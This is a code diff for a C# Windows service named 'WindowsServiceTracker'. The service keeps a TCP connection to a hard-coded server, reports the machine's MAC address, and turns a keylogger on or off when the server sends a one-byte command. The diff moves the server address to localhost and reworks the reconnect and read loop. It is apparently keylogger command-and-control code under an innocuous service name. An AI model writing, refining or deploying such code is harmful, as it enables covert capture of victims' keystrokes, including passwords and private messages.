@@ -27,7 +27,7 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
-        private const long IP_ADDRESS = 0x6c3911ac;
+        private const long IP_ADDRESS = 0x0100007F;//0x6c3911ac;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
@@ -189,29 +189,27 @@ namespace WindowsServiceTracker
         private void MaintainServerConnection()
         {
             macAddress = getMacAddress();
-            int waitBetweenReads = 0;
-            int maxwaitBetweenReads = 60; 
-            int maxWaitToRead = 5;
-            int waitToRead = 0;
+            int maxwaitBetweenConnects = 60;
+            int waitToConnect = 0;
             int bufferSize = 1;
             byte[] buffer = new byte[bufferSize];
             while (tcpKeepAlive)
             {
-                if (tcp == null || !CheckTCPConnected())
+                if (tcp == null)
                 {
                     try 
                     {
                         Connect();
-                        waitToRead = 0;
+                        waitToConnect = 0;
                         getTcpStream();
                         SendStringMsg(macAddress);
                     }
                     catch (Exception)
                     {
-                        Thread.Sleep(waitToRead * 1000);
-                        if (waitToRead < maxwaitBetweenReads)
+                        Thread.Sleep(waitToConnect * 1000);
+                        if (waitToConnect < maxwaitBetweenConnects)
                         {
-                            waitToRead += 5;
+                            waitToConnect += 5;
                         }
                     }
                 }
@@ -223,33 +221,34 @@ namespace WindowsServiceTracker
                     {
                         getTcpStream();
                     }
-                    else if (tcpStream.DataAvailable)
+                    else 
                     {
-                        waitBetweenReads = 0;
-                        try {
-                            tcpStream.Read(buffer, 0, bufferSize);
-                            switch (buffer[0])
+                        try 
+                        {
+                            int bytesRead;
+                            bytesRead = tcpStream.Read(buffer, 0, bufferSize);
+
+                            if (bytesRead == 0)
                             {
-                                case 0:
-                                    StartKeylogger();
-                                    break;
-                                case 1:
-                                    StopKeylogger();
-                                    break;
-                                default:
-                                    break;
+                                tcp = null;
+                                tcpStream = null;
+                            }
+                            else {
+                                switch (buffer[0])
+                                {
+                                    case 0:
+                                        StartKeylogger();
+                                        break;
+                                    case 1:
+                                        StopKeylogger();
+                                        break;
+                                    default:
+                                        break;
+                                }
                             }
                         }
                         catch (Exception)
                         {}
-                    }
-                    else
-                    {
-                        Thread.Sleep(waitBetweenReads * 1000);
-                        if (waitBetweenReads < maxWaitToRead)
-                        {
-                            waitBetweenReads++;
-                        }
                     }
                 }
             }
